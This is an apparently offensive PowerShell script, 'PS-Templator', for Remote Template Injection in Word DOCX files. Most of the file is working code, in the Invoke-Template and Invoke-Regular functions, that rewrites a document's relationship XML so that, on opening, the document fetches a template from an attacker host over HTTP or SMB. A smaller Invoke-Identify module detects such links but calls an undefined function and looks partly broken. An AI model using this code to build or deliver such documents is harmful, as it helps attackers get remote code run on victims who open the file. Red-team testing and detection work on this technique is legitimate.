<#
    RTI-Toolkit File: PS-Templator.ps1
    Author: Nikos Vourdas (@nickvourd)
    License: MIT
    Required Dependencies: None
#>

#Global Variables
$global:version = "1.0.0"

function Get-Logo{
<#
    .SYNOPSIS

    This module prints logo.

    .DESCRIPTION

    Get-Logo prints the Ascii art logo of PS-Templator tool.

    .Example

    PS > Get-Logo

#>
    $ascii = @"

    __________              ___________                   .__          __                
    \______   \______       \__    ___/___   _____ ______ |  | _____ _/  |_  ___________ 
     |     ___/  ___/  ______ |    |_/ __ \ /     \\____ \|  | \__  \\   __\/  _ \_  __ \
     |    |   \___ \  /_____/ |    |\  ___/|  Y Y  \  |_> >  |__/ __ \|  | (  <_> )  | \/
     |____|  /____  >         |____| \___  >__|_|  /   __/|____(____  /__|  \____/|__|   
                  \/                     \/      \/|__|             \/   
                                  
                          ~ Created with <3 by @nickvourd ~
                            
                                   Version: $global:version

"@

    Write-Host $ascii`n

}

function Get-Version{
<#
    .SYNOPSIS

    This module prints the version.
    
    .DESCRIPTION

    Get-Version prints the current version of PS-Templator tool.

    .EXAMPLE

    PS > Get-Version

    .LINK

    Github: https://github.com/nickvourd/RTI-Toolkit
#>

    Write-Host "`n[+] Current Version:" $global:version`n

}

function Search-Path($path, $statement){
<#
    .SYNOPSIS

    This module searches path existence.
    .
    .DESCRIPTION

    Search-Path tries to search if a path exist in the system.

    .EXAMPLE

    PS > Search-Path "C:\Windows\Tasks" "Output"

    .LINK

    Github: https://github.com/nickvourd/RTI-Toolkit
#>

    $pathFlag = $false

    if (Test-Path -Path $path){

        $pathFlag = $true
    }
    else{

        Write-Host [!] $statement path does not exist...`n

        Break
    }

    return $pathFlag

}

function Determine-PathType($file){
<#
    .SYNOPSIS

    This module determines the file path type.
    .
    .DESCRIPTION

    Determine-PathType tries to determine if the given file is in absolute path or not.

    .EXAMPLE

    PS > Determine-PathType C:\Users\nickvourd\Desktop\Document.docx

    .EXAMPLE

    PS > Determine-PathType Document.docx

    .LINK

    Github: https://github.com/nickvourd/RTI-Toolkit
#>

    $searchPathType = [System.IO.Path]::IsPathRooted($file)

    return $searchPathType

}

function Determine-FileType($file, $statement){
<#
    .SYNOPSIS

    This module determines the file type of a document.
    .
    .DESCRIPTION

    Determine-FileType tries to determine if the given file is docx document or not.

    .EXAMPLE

    PS > Determine-FileType C:\Users\nickvourd\Desktop\Document.docx InputDoc

    .EXAMPLE

    PS > Determine-FileType Document.docx InputDoc

    .LINK

    Github: https://github.com/nickvourd/RTI-Toolkit
#>
    
    $fileExtension = [IO.Path]::GetExtension($file)

    if ($fileExtension -ne ".docx"){

        Write-Host [!] $statement is not a docx file...`n

        Break
    }
  
}

function Search-File($file, $statement){
<#
    .SYNOPSIS

    This module searches given file in the system.
    .
    .DESCRIPTION

    Search-File tries to seach if given file exist in the system or not.

    .EXAMPLE

    PS > Search-File C:\Users\nickvourd\Desktop\Document.docx InputDoc

    .EXAMPLE

    PS > Search-File Document.docx InputDoc

    .LINK

    Github: https://github.com/nickvourd/RTI-Toolkit
#>

    #Call function named Determine-PathType
    $foundPathType = Determine-PathType $file

    if ($foundPathType -eq $true){                
        #Full path type file search
        $searchFile = Get-ChildItem $file -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
    }
    else{
        #Set current system drive
        $localDrive = $pwd.drive.name + ":\"

        #Relative path type file search
        $searchFile = Get-ChildItem $file -Path $localDrive -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
    }

    if ($searchFile -eq $null){

        Write-Host [!] $statement not found...`n

        Break
    }

    return $searchFile
}

function Investigate-Attack-Type($xmlFile, $filenameFolder, $bakDocument, $attackNumber){
<#
    .SYNOPSIS

    This module searches given XML file in the system and determines the attack type.
    .
    .DESCRIPTION

    Investigate-Attack-Type tries to seach if given XML file exist in the system or not and suggest you which type of attack should you use.

    .EXAMPLE

    PS > Investigate-Attack-Type C:\Users\nickvourd\Desktop\Document\word\_rels\settings.xml.rels C:\Users\nickvourd\Desktop\Document C:\Users\nickvourd\Desktop\Document.docx.bak 1

    .LINK

    Github: https://github.com/nickvourd/RTI-Toolkit
#>

   
  $searchFile = Get-ChildItem $xmlFile -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName

  if ($attackNumber -eq 1){
    if ($searchFile -eq $null){
        Write-Host [!] $xmlFile does not exists.`n
        Write-Host [!] Use Invoke-Regular module for default DOCX documents without Templates.`n
        Write-Host [+] Your InputDoc as Back Up: $bakDocument`n

        #Clean the rubbish
        Remove-Item -LiteralPath $filenameFolder -Recurse -Force 

        Break
    }
  }
  elseif ($attackNumber -eq 2){
    if ($searchFile -ne $null){
        Write-Host [!] $xmlFile exists.`n
        Write-Host [!] Use Invoke-Template module for DOCX documents with Templates.`n
        Write-Host [+] Your InputDoc as Back Up: $bakDocument`n

        #Clean the rubbish
        Remove-Item -LiteralPath $filenameFolder -Recurse -Force 

        Break
    }
  }
}

function Determine-Number-RID($xmlFile){
<#
    .SYNOPSIS

    This module searches for the number of rids in settings.xml file.
    .
    .DESCRIPTION

    Determine-Number-RID tries to seach for the number of rids in settings.xml file (Invoke-Regular attack).

    .EXAMPLE

    PS > Determine-Number-RID C:\Users\nickvourd\Desktop\Document\word\settings.xml

    .LINK

    Github: https://github.com/nickvourd/RTI-Toolkit
#>

    #namespaces
    $xmlNamespaceR="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
    $xmlNamespaceW="http://schemas.openxmlformats.org/wordprocessingml/2006/main"

    $rid = 0

    [xml]$xmlElm = Get-Content $xmlFile
    $documentNamespace = @{r=$xmlNamespaceR;w=$xmlNamespaceW}
    $xmlElm | Select-Xml -XPath "//*/@r:id" -Namespace $documentNamespace | foreach {
        if ([int]($_.Node."#text".substring(3)) -gt [int]$rid)
        {
            $rid = [int]($_.Node."#text".substring(3))
        }
    }

    $rid++
    
    return $rid
} 

function Invoke-Template{
<#
    .SYNOPSIS

    This module is used for default Office Word templates.

    .DESCRIPTION

    Invoke-Template implements remote template links into default Office Word templates.

    .PARAMETER InputDoc

    The input DOCX document with the default Office template.

    .PARAMETER Link

    The input Link for DOCX document.

    .PARAMETER Output

    The output DOCX document.

    .EXAMPLE

    PS > Invoke-Template -InputDoc Document.docx -Link "http://192.168.1.6:80/template.dot" -Output FinalDoc.docx

    This inserts a URL link to a DOCX document.

    .EXAMPLE

     PS > Invoke-Template -InputDoc C:\Users\nickvourd\Desktop\Document.docx -Link "http://192.168.1.6:80/template.dot" -Output C:\Windows\Tasks\FinalDoc.docx
    
    This inserts a URL link to a DOCX document (Full path example).

    .EXAMPLE

     PS > Invoke-Template -InputDoc C:\Users\nickvourd\Desktop\Document.docx -Link "http://192.168.1.6:80/template.dot"
    
    This inserts a URL link to a DOCX document (No Output).

    .EXAMPLE

    PS > Invoke-Template -InputDoc Document.docx -Link "\\192.168.1.6\smb\template.dotm" -Output FinalDoc.docx

    This inserts a share link to a DOCX document.

    .LINK

    Github: https://github.com/nickvourd/RTI-Toolkit
#>

    #Arguments
    param (
        [Parameter(Mandatory=$True,Position=1)]
            [ValidateNotNull()]
    		[string]$InputDoc,

		[Parameter(Mandatory=$True,Position=2)]
    		[ValidateNotNull()]
    		[string]$Link,

		[Parameter(Mandatory=$False,Position=3)]
    		[ValidateNotNull()]
    		[string]$Output
	)

    #Call function named Get-Logo
    Get-Logo

    #Call function named Search-File
    $foundFile = Search-File $InputDoc InputDoc

    #Call function named Determine-FileType
    Determine-FileType $foundFile InputDoc

    if ($PSBoundParameters.ContainsKey('Output')){

        #Call function named Determine-FileType
        Determine-FileType $Output Output
    }

    #Keep back up of the input document
    $bakDocument = $foundFile + ".bak"
    Copy-Item $foundFile -Destination $bakDocument

    #Convert to zip archive
    $filenameFolder = $foundFile.Replace(".docx","")
    $filenameFolderAll = $filenameFolder + "\*"
    $zipArchive = $foundFile + ".zip"
    Rename-Item -Path $foundFile -NewName $zipArchive

    #Expand archive
    Expand-Archive -Path $zipArchive -DestinationPath $filenameFolder
    Remove-Item -Path $zipArchive -Force

    #Set XML file path
    $xmlFile = $filenameFolder +"\word\_rels\settings.xml.rels"

    #call function named Investigate-Attack-Type
    Investigate-Attack-Type $xmlFile $filenameFolder $bakDocument 1 

    #Get elements of XML file
    [xml]$xmlElm = Get-Content $xmlFile

    foreach($relationship in $XmlElm.Relationships.Relationship){
    	if ($relationship.Type.EndsWith('attachedTemplate'))
    	{
        	$relationship.Target = $Link
    	}
    }

    #Save changes
    $xmlElm.Save($xmlFile)

    #Compress new archive
    Compress-Archive -Path $filenameFolderAll -DestinationPath $zipArchive

    if($PSBoundParameters.ContainsKey('Output')){

        #Call function named Determine-PathType
        $foundOutputType = Determine-PathType $Output Output

        $outputFilename = $Output

        #If Output is an aboslute path
        if ($foundOutputType -ne $false){
            $outputFolder = Split-Path $Output
            $outputFilename = [System.IO.Path]::GetFileName($Output)

            #Call function named Search-Path
            $foundPath = Search-Path $outputFolder Output

            if ($foundPath -ne $false){
                #Rename zip archive to docx file
                Rename-Item -Path $zipArchive -NewName $outputFilename -Force

                #Call function named Search-File
                $foundOutputFile = Search-File $outputFilename "Output Filename"

                #Move new docx to Output folder
                Move-Item -Path $foundOutputFile -Destination $outputFolder -Force
            }
        }
        else{
            #Rename zip archive to docx file
            Rename-Item -Path $zipArchive -NewName $outputFilename -Force

            #Call function named Search-File
            $foundOutputFile = Search-File $outputFilename "Output Filename"

            $Output = $foundOutputFile
        }
    }
    else{
        $Output = $foundFile
        
        #Rename zip archive to docx file
        Rename-Item -Path $zipArchive -NewName $foundFile -Force
    }
    
    #Clean the rubbish
    Remove-Item -LiteralPath $filenameFolder -Recurse -Force 

    #Message success output
    Write-Host "[+] Your InputDoc as Back Up: $bakDocument`n"
    Write-Host "[+] Exported document: $Output`n"
}

function Invoke-Regular{
<#
    .SYNOPSIS

    This module is used for regular Office Word documents without template.

    .DESCRIPTION

    Invoke-Regular implements remote template links into default Office Word documents.

    .PARAMETER InputDoc

    The input DOCX document with the default Office document.

    .PARAMETER Link

    The input Link for DOCX document.

    .PARAMETER Output

    The output DOCX document.

    .PARAMETER TemplateName

    The Template name for /docProps/app.xml in a docx document. By default it is Normal.dotm (Optional Parameter)

    .EXAMPLE

    PS > Invoke-Regular -InputDoc Document.docx -Link "http://192.168.1.6:8080/template.dot" -Output FinalDoc.docx

    This inserts a URL link to a DOCX document.

    .EXAMPLE

     PS > Invoke-Regular -InputDoc C:\Users\nickvourd\Desktop\Document.docx -Link "http://192.168.1.6/template.dot" -Output C:\Windows\Tasks\FinalDoc.docx
    
    This inserts a URL link to a DOCX document (Full path example).

    .EXAMPLE

     PS > Invoke-Regular -InputDoc C:\Users\nickvourd\Desktop\Document.docx -Link "http://192.168.1.6/template.dot"
    
    This inserts a URL link to a DOCX document (No Output).

    .EXAMPLE

    PS > Invoke-Regular -InputDoc Document.docx -Link "http://192.168.1.6/template.dot" -Output FinalDoc.docx -TemplateName Test.dotx

    This inserts a share link to a DOCX document and determine a Template name.

    .EXAMPLE

    PS > Invoke-Regular -InputDoc Document.docx -Link "\\192.168.1.6\smb\template.dot" -Output FinalDoc.docx

    This inserts a share link to a DOCX document.

    .EXAMPLE

    PS > Invoke-Regular -InputDoc Document.docx -Link "\\192.168.1.6\smb\template.dot" -Output FinalDoc.docx -TemplateName Default.dotx

    This inserts a share link to a DOCX document and determine a Template name.

    .LINK

    Github: https://github.com/nickvourd/RTI-Toolkit
#>

    #Arguments
    param (
        [Parameter(Mandatory=$True,Position=1)]
            [ValidateNotNull()]
    		[string]$InputDoc,

		[Parameter(Mandatory=$True,Position=2)]
    		[ValidateNotNull()]
    		[string]$Link,

		[Parameter(Mandatory=$False,Position=3)]
    		[ValidateNotNull()]
    		[string]$Output,

		[Parameter(Mandatory=$False,Position=4)]
    		[ValidateNotNull()]
    		[string]$TemplateName
	)

    #Call function named Get-Logo
    Get-Logo

    #Call function named Search-File
    $foundFile = Search-File $InputDoc InputDoc

    #Call function named Determine-FileType
    Determine-FileType $foundFile InputDoc

    if ($PSBoundParameters.ContainsKey('Output')){
        #Call function named Determine-FileType
        Determine-FileType $Output Output
    }

    #Keep back up of the input document
    $bakDocument = $foundFile + ".bak"
    Copy-Item $foundFile -Destination $bakDocument

    #Convert to zip archive
    $filenameFolder = $foundFile.Replace(".docx","")
    $filenameFolderAll = $filenameFolder + "\*"
    $zipArchive = $foundFile + ".zip"
    Rename-Item -Path $foundFile -NewName $zipArchive

    #Expand archive
    Expand-Archive -Path $zipArchive -DestinationPath $filenameFolder
    Remove-Item -Path $zipArchive -Force

    #Modify \word\settings.xml
    #Set XML file path
    $xmlFile = $filenameFolder +"\word\_rels\settings.xml.rels"

    #call function named Investigate-Attack-Type
    Investigate-Attack-Type $xmlFile $filenameFolder $bakDocument 2 

    #Reset XML file path
    $xmlFile = $filenameFolder +"\word\settings.xml"

    #Call function named Determine-Number-RID
    $foundRid = Determine-Number-RID $xmlFile

    #set new value
    $newValue = @"
<w:attachedTemplate r:id="rId$foundRid"/>
</w:settings>
"@
    #Set XML file
    [xml]$xmlContent = Get-Content $xmlFile

    #Repalce string in XML file
    $xmlReplaceString = $xmlContent.OuterXml.replace("</w:settings>",$newValue)
    [xml]$xmlContent = $xmlReplaceString

    #Save XML file with changes
    Set-Content -Path $xmlFile -Value $xmlContent
    $xmlContent.Save($xmlFile)

    #Create \word\_rels\settings.xml.rels file
    $xmlFile = $filenameFolder +"\word\_rels\settings.xml.rels"

    $contentSettingsRelsXml = 
     @"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId$foundRid" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="$Link" TargetMode="External" /></Relationships>
"@
    Set-Content -Path $xmlFile -Value $contentSettingsRelsXml

    #if user used parameter named -TemplateName
    if($PSBoundParameters.ContainsKey('TemplateName')){
        #Modify \docProps\app.xml
        $xmlFile = $filenameFolder +"\docProps\app.xml"

        #Set XML file
        [xml]$xmlElm = Get-Content $xmlFile
    
        #Inset Template Name
        $xmlElm.Properties.Template = "$TemplateName"

        #Save XML file 
        Set-Content -Path $xmlFile -Value $XmlFile
        $xmlElm.Save($xmlFile)
    }

    #Compress new archive
    Compress-Archive -Path $filenameFolderAll -DestinationPath $zipArchive

    if($PSBoundParameters.ContainsKey('Output')){

        #Call function named Determine-PathType
        $foundOutputType = Determine-PathType $Output Output

        $outputFilename = $Output

        #If Output is an aboslute path
        if ($foundOutputType -ne $false){
            $outputFolder = Split-Path $Output
            $outputFilename = [System.IO.Path]::GetFileName($Output)

            #Call function named Search-Path
            $foundPath = Search-Path $outputFolder Output

            if ($foundPath -ne $false){
                #Rename zip archive to docx file
                Rename-Item -Path $zipArchive -NewName $outputFilename -Force

                #Call function named Search-File
                $foundOutputFile = Search-File $outputFilename "Output Filename"

                #Move new docx to Output folder
                Move-Item -Path $foundOutputFile -Destination $outputFolder -Force
            }
        }
        else{
            #Rename zip archive to docx file
            Rename-Item -Path $zipArchive -NewName $outputFilename -Force

            #Call function named Search-File
            $foundOutputFile = Search-File $outputFilename "Output Filename"

            $Output = $foundOutputFile
        }
    }
    else{
        $Output = $foundFile
        
        #Rename zip archive to docx file
        Rename-Item -Path $zipArchive -NewName $foundFile -Force
    }
    
    #Clean the rubbish
    Remove-Item -LiteralPath $filenameFolder -Recurse -Force 

    #Message success output
    Write-Host "[+] Your InputDoc as Back Up: $bakDocument`n"
    Write-Host "[+] Exported document: $Output`n" 
}

function Invoke-Identify{
    <#
        .SYNOPSIS
    
        This module is used for identifying malicious docx by Remote Template Injection.
    
        .DESCRIPTION
    
        Invoke-Identify indentifies remote template links into Office Word docx documents.
    
        .PARAMETER InputDoc
    
        The input DOCX document with the default Office template.
    
        .PARAMETER Output
    
        The output of the process.
    
        .EXAMPLE
    
        PS > Invoke-Identify -InputDoc Document.docx -Output results.txt
    
        This tries to identify if the input docx is malicious and saves output in a file.
    
        .EXAMPLE
    
         PS > Invoke-Identify -InputDoc Document.docx
        
        This tries to identify if the input docx is malicious.

        .LINK

        Github: https://github.com/nickvourd/RTI-Toolkit
    #>
    
        #Arguments
        param (
            [Parameter(Mandatory=$True,Position=1)]
                [ValidateNotNull()]
                [string]$InputDoc,
    
            [Parameter(Mandatory=$False,Position=3)]
                [ValidateNotNull()]
                [string]$Output
        )
    
        #Call function named Get-Logo
        Get-Logo
    
        #Call function named Search-File
        $foundFile = Search-File $InputDoc InputDoc
    
        #Call function named Determine-FileType
        Determine-FileType $foundFile InputDoc 0
    
        if ($PSBoundParameters.ContainsKey('Output')){
    
            #Call function named Determine-FileType
            Determine-FileType $Output Output 1
    
            #Call function named Determine-PathType
            $foundOutputType = Determine-PathType $Output Output
    
        }
    
        #Keep back up of the input document
        $bakDocument = $foundFile + ".bak"
        Copy-Item $foundFile -Destination $bakDocument
    
        #Convert to zip archive
        $filenameFolder = $foundFile.Replace(".docx","")
        $filenameFolderAll = $filenameFolder + "\*"
        $zipArchive = $foundFile + ".zip"
        Rename-Item -Path $foundFile -NewName $zipArchive
    
        #Expand archive
        Expand-Archive -Path $zipArchive -DestinationPath $filenameFolder
        Remove-Item -Path $zipArchive -Force
    
        #Set a path file to investigate
        $emergencyPathFile = $filenameFolder +"\word\_rels\settings.xml.rels"
    
        #call function named Search-Path
        $foundPathFile = Search-Path $emergencyPathFile $foundFile 1 $foundFile $bakDocument $filenameFolder
    
        #if file exists
        if ($foundPathFile -ne $False){
            #Get elements of XML file
            [xml]$xmlElm = Get-Content $emergencyPathFile
    
            foreach($relationship in $XmlElm.Relationships.Relationship){
                   if ($relationship.Type.EndsWith('attachedTemplate'))
                {
                    $target = $relationship.Target
                }
             }
                
            $successMessage = "[+] $foundFile is clean Document...`n"
            $failMessage = "[!] Malicious Link found: $target`n"
            
            if ($target.StartsWith("file:///") -and $target.EndsWith("_win32.dotx")){
                Write-Host $successMessage`n
                if($PSBoundParameters.ContainsKey('Output')){
                    #call function named Check-Output
                    $outputFullPath = Check-Output $Output $foundOutputType $successMessage
                    Write-Host "[+] Output saved: $outputFullPath`n"
                }
            }
            else{
                Write-Host $failMessage`n
                if($PSBoundParameters.ContainsKey('Output')){
                   #call function named Check-Output
                   $outputFullPath = Check-Output $Output $foundOutputType $failMessage
                   Write-Host "[+] Output saved: $outputFullPath`n"
                }
            }          
        }
    
        #Compress new archive
        Compress-Archive -Path $filenameFolderAll -DestinationPath $zipArchive
    
        #Rename zip archive to docx file
        Rename-Item -Path $zipArchive -NewName $foundFile -Force
    
        #Clean the rubbish
        Remove-Item -LiteralPath $filenameFolder -Recurse -Force 
        Remove-Item -LiteralPath $bakDocument -Recurse -Force
    }
    